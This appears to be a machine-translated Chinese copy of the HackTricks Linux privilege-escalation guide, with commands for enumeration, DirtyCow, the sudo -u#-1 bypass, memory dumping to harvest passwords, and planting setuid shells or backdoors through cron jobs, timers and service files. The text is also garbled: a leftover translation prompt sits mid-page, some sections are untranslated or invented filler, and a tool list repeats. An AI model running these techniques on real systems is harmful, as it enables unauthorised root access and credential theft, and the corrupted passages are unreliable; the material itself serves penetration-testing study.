# Linux提权

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统的一些信息。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对`PATH`变量中的任何文件夹具有写权限**，你可能能够劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息，如密码或API密钥？
```bash
(env || set) 2>/dev/null
```
### 内核漏洞利用

检查内核版本，以及是否存在可以用于提升权限的漏洞。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
您可以在以下链接中找到一份良好的易受攻击的内核列表和一些已经编译好的漏洞利用程序：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。
其他一些可以找到一些已编译好的漏洞利用程序的网站有：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries) 和 [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，您可以执行以下操作：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
以下是一本关于黑客技术的书籍中的内容。以下内容来自文件/hive/hacktricks/linux-hardening/privilege-escalation/README.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏一词、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需翻译和markdown语法即可。

工具可以帮助搜索内核漏洞利用：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（仅在受害者中执行，仅检查内核2.x的漏洞利用）

始终在Google中搜索内核版本，也许你的内核版本在某些内核漏洞利用中被提及，这样你就可以确保该漏洞利用是有效的。

### CVE-2016-5195（DirtyCow）

Linux特权提升 - Linux内核 <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo版本

基于出现的有漏洞的sudo版本：
```bash
searchsploit sudo
```
您可以使用以下grep命令检查sudo版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

来自 @sickrov

#### 概述

在sudo版本1.28之前，存在一个特权升级漏洞，该漏洞允许攻击者绕过sudo的限制，以root权限执行命令。

#### 漏洞利用

攻击者可以利用以下方法利用此漏洞：

1. 使用`sudo -l`命令查看当前用户的sudo权限。

2. 如果用户具有`ALL`权限，则可以执行任意命令。

3. 如果用户具有特定命令的权限，则可以使用该命令执行特权升级。

#### 漏洞修复

升级sudo到1.28版本或更高版本可以修复此漏洞。
```
sudo -u#-1 /bin/bash
```
### Dmesg签名验证失败

检查**HTB的smasher2 box**，以了解如何利用此漏洞的**示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举

In this section, we will explore additional techniques for system enumeration that can help us identify potential vulnerabilities and privilege escalation opportunities.

#### 1. Checking for SUID/SGID binaries

SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be assigned to executable files. When a user executes a SUID/SGID binary, the process runs with the privileges of the file owner or group, respectively. This can be exploited to gain elevated privileges.

To check for SUID/SGID binaries, use the following command:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This command will search the entire filesystem for files with the SUID permission set. The `-perm -4000` option specifies that we are looking for files with the SUID bit set.

Similarly, you can use the following command to search for SGID binaries:

```bash
find / -perm -2000 -type f 2>/dev/null
```

#### 2. Analyzing cron jobs

Cron is a time-based job scheduler in Linux. It allows users to schedule commands or scripts to run at specific intervals. Analyzing cron jobs can help us identify scheduled tasks that may be running with elevated privileges.

To view the list of cron jobs for the current user, use the following command:

```bash
crontab -l
```

To view the system-wide cron jobs, use the following command:

```bash
ls -la /etc/cron*
```

Inspect the contents of the cron files to identify any commands or scripts that are executed with elevated privileges.

#### 3. Checking for writable directories

Writable directories can be potential targets for privilege escalation. If a directory is writable by a privileged user or group, we may be able to place a malicious file or script in that directory and execute it with elevated privileges.

To check for writable directories, use the following command:

```bash
find / -writable -type d 2>/dev/null
```

This command will search the entire filesystem for directories that are writable by the current user.

#### 4. Analyzing installed packages

Analyzing the list of installed packages can help us identify outdated or vulnerable software that may be exploitable for privilege escalation.

To list the installed packages, use the following command:

```bash
dpkg -l
```

Inspect the list of packages and research any known vulnerabilities associated with them.

#### 5. Checking for world-writable files

World-writable files are files that can be modified by any user on the system. These files can be potential targets for privilege escalation.

To check for world-writable files, use the following command:

```bash
find / -perm -2 -type f 2>/dev/null
```

This command will search the entire filesystem for files that have the write permission for all users.

By performing these additional system enumeration techniques, we can gather more information about the system and identify potential vulnerabilities that can be exploited for privilege escalation.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor

AppArmor是一个Linux内核安全模块，用于限制应用程序的访问权限。它通过定义应用程序的访问规则来保护系统免受潜在的攻击。AppArmor可以防止恶意应用程序访问敏感文件和目录，从而提供了一层额外的安全防护。
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity是一个Linux内核补丁，旨在提供额外的安全功能和保护措施。它包括许多特性，如强制访问控制（MAC）、堆栈保护、随机化内核地址空间、系统调用过滤和防止内核漏洞利用等。这些功能可以帮助防止特权升级攻击和其他恶意行为。

Grsecurity的一个重要特性是RBAC（Role-Based Access Control），它允许管理员根据用户角色和权限来限制访问。这可以防止未经授权的用户执行危险操作或访问敏感数据。

要使用Grsecurity，您需要下载适用于您的内核版本的补丁，并将其应用于内核源代码。然后，重新编译和安装内核。请注意，Grsecurity补丁可能与其他内核补丁不兼容，因此在应用之前请务必仔细阅读文档和指南。

Grsecurity是一个强大的工具，可以提供额外的安全性，但它也可能导致一些兼容性问题和配置困难。因此，在使用之前，请确保您了解其工作原理，并在测试环境中进行充分测试。

有关Grsecurity的更多信息，请参阅官方文档和社区资源。
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX是一个Linux内核补丁，旨在增强系统的安全性。它通过实施内存保护措施来防止各种攻击，如缓冲区溢出和代码注入。PaX提供了一些功能，包括：

- **ASLR（地址空间布局随机化）**：通过随机化内存布局，使攻击者难以确定关键函数和数据的位置。
- **堆栈保护**：通过检测和阻止堆栈溢出攻击，保护程序的执行流程。
- **不可执行位（NX）**：将内存页面标记为不可执行，防止攻击者在内存中注入和执行恶意代码。
- **随机化虚拟地址空间（KASLR）**：随机化内核的虚拟地址空间，增加攻击者发现和利用内核漏洞的难度。

要启用PaX，您需要使用支持PaX的内核，并在启动时使用相应的内核参数。请注意，PaX可能会对某些应用程序和功能产生兼容性问题，因此在启用之前，请确保测试和评估系统的稳定性。

有关更多信息和使用PaX的详细指南，请参阅[PaX官方网站](https://pax.grsecurity.net/)。
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield是一种用于增强Linux系统安全性的内核功能。它通过限制可执行文件的内存区域来防止缓冲区溢出攻击。Execshield通过以下两种方式实现：

1. **地址空间布局随机化（ASLR）**：Execshield随机化可执行文件的内存布局，使攻击者难以确定关键代码和数据的位置。这样一来，即使攻击者成功利用了缓冲区溢出漏洞，也很难找到正确的内存地址来执行恶意代码。

2. **栈随机化（Stack Randomization）**：Execshield随机化程序的栈内存布局，使攻击者无法准确预测栈的位置。这样一来，即使攻击者成功利用了栈溢出漏洞，也很难找到正确的栈地址来执行恶意代码。

Execshield是一种有效的安全措施，可以帮助防止恶意攻击者利用缓冲区溢出和栈溢出漏洞进行特权提升。
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux（Security-Enhanced Linux）是一种安全增强的Linux操作系统安全机制。它通过强制访问控制（MAC）来限制进程的权限，从而提供了更高的系统安全性。

SElinux的工作原理是基于标签的访问控制（TAC）。每个文件、进程和对象都被分配了一个唯一的安全上下文标签，用于控制对其的访问权限。这些标签包括了主体（用户或进程）、对象（文件或目录）和类型（文件类型或进程类型）。

通过使用SElinux，可以限制进程的访问权限，防止恶意进程对系统进行攻击或滥用权限。此外，SElinux还可以防止进程对敏感文件和目录的访问，从而提供了更高的数据保护。

要启用SElinux，可以通过修改`/etc/selinux/config`文件中的`SELINUX`参数来设置。常见的参数值包括`enforcing`（强制模式，严格限制访问）、`permissive`（宽容模式，记录违规但不限制访问）和`disabled`（禁用模式，完全关闭SElinux）。

在进行系统硬化时，应考虑启用SElinux以增强系统的安全性。然而，需要注意的是，SElinux可能会导致一些应用程序无法正常运行，因此在启用SElinux之前，应进行充分的测试和评估。
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR)（地址空间布局随机化）是一种操作系统的安全机制，用于防止恶意攻击者利用内存地址的可预测性进行攻击。ASLR通过在每次启动程序时随机化内存地址的分配，使得攻击者难以确定特定代码或数据的位置。

ASLR的工作原理是将程序的代码、堆和栈等关键组件加载到内存中的随机位置。这样，即使攻击者能够发现某个漏洞，也很难确定正确的内存地址来执行恶意代码。ASLR可以有效减少针对缓冲区溢出和代码注入等攻击的成功率。

ASLR的随机化程度可以根据操作系统的设置进行调整。较弱的ASLR可能只对某些组件进行随机化，而较强的ASLR则会对整个内存空间进行随机化。在进行渗透测试或漏洞利用时，了解目标系统的ASLR设置对于成功进行特权提升攻击非常重要。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker逃逸

如果你在一个Docker容器内部，你可以尝试逃离它：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## 驱动器

检查已挂载和未挂载的驱动器，以及它们的位置和原因。如果有任何未挂载的驱动器，你可以尝试挂载它并检查是否存在私人信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的二进制文件

```markdown
- [**find**](https://man7.org/linux/man-pages/man1/find.1.html): A powerful command-line tool used to search for files and directories based on various criteria.
- [**grep**](https://man7.org/linux/man-pages/man1/grep.1.html): A command-line utility used to search for patterns in text files.
- [**awk**](https://man7.org/linux/man-pages/man1/awk.1.html): A versatile programming language used for text processing and data extraction.
- [**sed**](https://man7.org/linux/man-pages/man1/sed.1.html): A stream editor used for filtering and transforming text.
- [**curl**](https://curl.se/): A command-line tool used to transfer data to or from a server.
- [**wget**](https://www.gnu.org/software/wget/): A command-line utility used to retrieve files from the web.
- [**nc**](https://man7.org/linux/man-pages/man1/nc.1.html): A networking utility used for reading from and writing to network connections.
- [**nmap**](https://nmap.org/): A powerful network scanning tool used for discovering hosts and services on a network.
- [**tcpdump**](https://www.tcpdump.org/): A command-line packet analyzer used to capture and analyze network traffic.
- [**wireshark**](https://www.wireshark.org/): A graphical network protocol analyzer used for network troubleshooting and analysis.
- [**ps**](https://man7.org/linux/man-pages/man1/ps.1.html): A command-line utility used to display information about running processes.
- [**top**](https://man7.org/linux/man-pages/man1/top.1.html): A command-line tool used to monitor system processes and resource usage.
- [**lsof**](https://man7.org/linux/man-pages/man8/lsof.8.html): A command-line utility used to list open files and the processes that opened them.
- [**strace**](https://man7.org/linux/man-pages/man1/strace.1.html): A debugging tool used to monitor system calls and signals.
- [**tcpdump**](https://www.tcpdump.org/): A command-line packet analyzer used to capture and analyze network traffic.
- [**wireshark**](https://www.wireshark.org/): A graphical network protocol analyzer used for network troubleshooting and analysis.
- [**ps**](https://man7.org/linux/man-pages/man1/ps.1.html): A command-line utility used to display information about running processes.
- [**top**](https://man7.org/linux/man-pages/man1/top.1.html): A command-line tool used to monitor system processes and resource usage.
- [**lsof**](https://man7.org/linux/man-pages/man8/lsof.8.html): A command-line utility used to list open files and the processes that opened them.
- [**strace**](https://man7.org/linux/man-pages/man1/strace.1.html): A debugging tool used to monitor system calls and signals.
```
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
此外，检查是否**安装了任何编译器**。如果您需要使用某些内核漏洞利用程序，这将非常有用，因为建议在您将要使用的机器上（或类似的机器上）编译它。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。也许有一些旧的Nagios版本（例如）可以被利用来提升权限...\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果您可以通过SSH访问机器，您还可以使用**openVAS**来检查机器内安装的过时和易受攻击的软件。

{% hint style="info" %}
_请注意，这些命令将显示大量大多数无用的信息，因此建议使用OpenVAS或类似的应用程序来检查是否安装的软件版本易受已知攻击的影响_
{% endhint %}

## 进程

查看正在执行的**进程**，并检查是否有任何进程具有**比应有的权限更高**（也许是由root执行的tomcat进程？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否有可能运行[**electron/cef/chromium调试器**，您可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas**通过检查进程的命令行中的`--inspect`参数来检测这些调试器。\
还要**检查您对进程二进制文件的权限**，也许您可以覆盖其他人的权限。

### 进程监控

您可以使用像[**pspy**](https://github.com/DominicBreuker/pspy)这样的工具来监控进程。这对于识别频繁执行的易受攻击的进程或满足一组要求时非常有用。

### 进程内存

服务器的一些服务在内存中以明文保存**凭据**。\
通常，您需要**root权限**才能读取属于其他用户的进程的内存，因此当您已经是root并且想要发现更多凭据时，这通常更有用。\
但是，请记住**作为普通用户，您可以读取自己拥有的进程的内存**。

{% hint style="warning" %}
请注意，现在大多数机器**默认不允许ptrace**，这意味着您无法转储属于您的非特权用户的其他进程。

文件_**/proc/sys/kernel/yama/ptrace\_scope**_控制ptrace的可访问性：

* **kernel.yama.ptrace\_scope = 0**：所有进程都可以进行调试，只要它们具有相同的uid。这是ptracing的经典方式。
* **kernel.yama.ptrace\_scope = 1**：只有父进程可以进行调试。
* **kernel.yama.ptrace\_scope = 2**：只有管理员可以使用ptrace，因为它需要CAP\_SYS\_PTRACE权限。
* **kernel.yama.ptrace\_scope = 3**：不允许使用ptrace跟踪任何进程。设置后，需要重新启动才能再次启用ptracing。
{% endhint %}

#### GDB

如果您可以访问FTP服务的内存（例如），您可以获取Heap并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB脚本

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程ID，**maps文件显示了内存在该进程的虚拟地址空间中的映射方式**；它还显示了**每个映射区域的权限**。**mem伪文件暴露了进程的内存本身**。通过**maps**文件，我们可以知道哪些**内存区域是可读的**以及它们的偏移量。我们利用这些信息来**在mem文件中定位并将所有可读的区域转储到一个文件中**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 `/dev/kmem` 来访问。\
通常情况下，`/dev/mem` 只能被 **root** 和 **kmem** 组读取。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux的ProcDump

ProcDump是Sysinternals工具套件中经典ProcDump工具的Linux版本。在[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)获取它。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，您可以使用以下工具：

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump)（需要root权限）- 您可以手动删除root要求，并转储您拥有的进程
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)中的脚本A.5（需要root权限）

### 从进程内存中获取凭据

#### 手动示例

如果您发现认证器进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
您可以转储进程（请参阅前面的部分，了解转储进程内存的不同方法），并在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

工具[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)可以从内存和一些**知名文件**中**窃取明文凭据**。它需要root权限才能正常工作。

| 功能                                               | 进程名称              |
| ------------------------------------------------- | -------------------- |
| GDM密码（Kali桌面，Debian桌面）                    | gdm-password         |
| Gnome Keyring（Ubuntu桌面，ArchLinux桌面）          | gnome-keyring-daemon |
| LightDM（Ubuntu桌面）                              | lightdm              |
| VSFTPd（活动FTP连接）                              | vsftpd               |
| Apache2（活动HTTP基本身份验证会话）                | apache2              |
| OpenSSH（活动SSH会话 - 使用sudo）                  | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时任务/Cron任务

检查是否存在可利用的定时任务漏洞。也许你可以利用以root权限执行的脚本（通配符漏洞？可以修改root使用的文件吗？使用符号链接？在root使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron路径

例如，在_/etc/crontab_文件中，你可以找到路径：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（注意用户"user"对/home/user具有写权限）

如果在这个crontab中，root用户尝试执行一些没有设置路径的命令或脚本。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以使用以下方法获取root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 使用带有通配符的脚本的Cron（通配符注入）

如果一个由root执行的脚本中的命令中有“**\***”，你可以利用这个来做一些意想不到的事情（比如权限提升）。例如：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面有路径，比如** _**/some/path/\***_ **，它是不容易受到攻击的（甚至** _**./\***_ **也不容易受到攻击）。**

阅读以下页面以了解更多通配符利用技巧：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron脚本覆盖和符号链接

如果你**可以修改由root执行的cron脚本**，你可以非常容易地获得一个shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由root执行的脚本使用了**你拥有完全访问权限的目录**，也许删除该文件夹并**创建一个符号链接文件夹到另一个**由你控制的脚本可能会有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的定时任务

您可以监视进程，以搜索每1、2或5分钟执行一次的进程。也许您可以利用它来提升特权。

例如，要在1分钟内每0.1秒监视一次，按照执行次数较少的命令进行排序，并删除已执行最多次数的命令，您可以执行以下操作：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) （这将监视并列出每个启动的进程）。

### 隐形的定时任务

可以创建一个定时任务，**在注释后面加上回车符**（没有换行符），这样定时任务就会生效。示例（注意回车符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你可以**修改它**，以便在服务**启动**、**重新启动**或**停止**时**执行**你的后门（也许你需要等待机器重启）。\
例如，在 .service 文件中创建你的后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你对服务执行的二进制文件具有**写权限**，你可以将它们更改为后门，这样当服务被重新执行时，后门将被执行。

### systemd 路径 - 相对路径

你可以使用以下命令查看 **systemd** 使用的路径：
```bash
systemctl show-environment
```
如果你发现你可以在路径中的任何文件夹中进行**写入**操作，那么你可能能够**提升权限**。你需要搜索服务配置文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在您可以编写的systemd PATH文件夹中创建一个与相对路径二进制文件**同名的可执行文件**，当服务被要求执行易受攻击的操作（**启动**，**停止**，**重新加载**）时，您的**后门将被执行**（通常非特权用户无法启动/停止服务，但请检查是否可以使用`sudo -l`）。

**使用`man systemd.service`了解更多关于服务的信息。**

## **定时器**

**定时器**是以`**.timer**`结尾的systemd单元文件，用于控制`**.service**`文件或事件。**定时器**可以用作cron的替代品，因为它们内置了对日历时间事件和单调时间事件的支持，并且可以异步运行。

您可以使用以下命令枚举所有定时器：
```bash
systemctl list-timers --all
```
### 可写的定时器

如果你可以修改一个定时器，你可以让它执行一些已存在的systemd.unit（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中，您可以了解到什么是Unit：

> 当此计时器到期时要激活的Unit。参数是一个Unit名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器Unit具有相同名称的Service（除了后缀）。建议激活的Unit名称和计时器Unit的Unit名称相同，除了后缀。

因此，要滥用此权限，您需要：

* 找到一些systemd unit（例如`.service`），它正在**执行可写的二进制文件**
* 找到一些systemd unit，它正在**执行相对路径**，并且您对**systemd PATH**具有**可写权限**（以冒充该可执行文件）

**通过`man systemd.timer`了解更多关于计时器的信息。**

### **启用计时器**

要启用计时器，您需要root权限并执行以下操作：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
请注意，通过在`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`上创建符号链接来激活**计时器**。

## 套接字

简而言之，Unix套接字（技术上，正确的名称是Unix域套接字，**UDS**）允许在同一台机器或不同机器上的客户端-服务器应用程序框架中的两个不同进程之间进行通信。更准确地说，它是使用标准Unix描述符文件在计算机之间进行通信的一种方式（来自[这里](https://www.linux.com/news/what-socket/)）。

可以使用`.socket`文件配置套接字。

**使用`man systemd.socket`了解更多关于套接字的信息**。在此文件中，可以配置几个有趣的参数：

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项不同，但概括起来用于**指示它将在何处监听**套接字（AF_UNIX套接字文件的路径、要监听的IPv4/6和/或端口号等）。
* `Accept`：接受一个布尔值参数。如果为**true**，则为每个传入连接**生成一个服务实例**，并且只传递连接套接字给它。如果为**false**，则所有监听套接字本身都**传递给启动的服务单元**，并且为所有连接生成一个服务单元。对于数据报套接字和FIFO，其中一个服务单元无条件处理所有传入流量，此值将被忽略。**默认为false**。出于性能原因，建议仅以适合`Accept=no`的方式编写新的守护程序。
* `ExecStartPre`、`ExecStartPost`：接受一个或多个命令行，在创建和绑定监听**套接字**/FIFO之前或之后**执行**。命令行的第一个标记必须是绝对文件名，然后是进程的参数。
* `ExecStopPre`、`ExecStopPost`：在关闭和删除监听**套接字**/FIFO之前或之后**执行**的附加**命令**。
* `Service`：指定在**传入流量**上**激活**的**服务**单元名称。此设置仅允许用于`Accept=no`的套接字。默认为与套接字同名的服务（后缀替换）。在大多数情况下，不需要使用此选项。

### 可写的`.socket`文件

如果找到一个**可写的**`.socket`文件，您可以在`[Socket]`部分的开头添加类似于`ExecStartPre=/home/kali/sys/backdoor`的内容，这样在创建套接字之前将执行后门。因此，您**可能需要等待机器重启**。\
请注意，系统必须使用该套接字文件配置，否则后门将不会被执行。

### 可写的套接字

如果您**发现任何可写的套接字**（现在我们谈论的是Unix套接字，而不是配置的`.socket`文件），那么您可以与该套接字进行通信，可能利用漏洞。

### 枚举Unix套接字
```bash
netstat -a -p --unix
```
### 原始连接

To establish a raw connection to a remote server, you can use the `nc` command. This allows you to interact with the server directly without any protocol-specific handling.

```bash
nc <IP_ADDRESS> <PORT>
```

Replace `<IP_ADDRESS>` with the IP address of the remote server and `<PORT>` with the port number you want to connect to.

Once the connection is established, you can send and receive data through the terminal. This can be useful for testing network connectivity or debugging network-related issues.

To exit the raw connection, you can use the `Ctrl + C` keyboard shortcut.

Note: Raw connections do not provide any encryption or authentication. Use them only in trusted environments.
```bash
